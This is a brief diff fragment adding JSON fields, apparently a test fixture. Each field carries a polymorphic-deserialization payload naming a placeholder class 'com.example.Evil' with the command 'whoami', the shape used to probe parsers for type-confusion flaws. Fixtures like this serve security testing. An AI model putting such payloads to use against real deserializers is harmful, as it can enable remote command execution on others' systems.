+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
